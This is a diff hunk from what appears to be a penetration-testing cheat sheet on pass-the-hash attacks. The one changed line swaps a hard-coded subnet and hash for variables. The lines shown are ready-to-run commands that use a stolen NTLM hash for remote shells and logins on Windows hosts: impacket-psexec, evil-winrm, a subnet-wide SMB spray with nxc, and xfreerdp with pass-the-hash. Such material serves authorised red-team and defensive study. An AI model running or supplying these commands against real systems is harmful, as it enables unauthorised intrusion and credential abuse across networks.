@@ -116,7 +116,7 @@ impacket-psexec $DOMAIN/$USER@$TARGET -hashes :NTLMHASH
 evil-winrm -i $TARGET -u $USER -H NTLMHASH
 
 # Subnet spray
-netexec smb 192.168.10.0/24 -u Administrator -H NTLMHASH --local-auth
+nxc smb "$SUBNET" -u Administrator -H "$NTLM_HASH" --local-auth
 
 # RDP with PtH (requires Restricted Admin mode)
 xfreerdp /v:$TARGET /u:$USER /pth:NTLMHASH /d:$DOMAIN
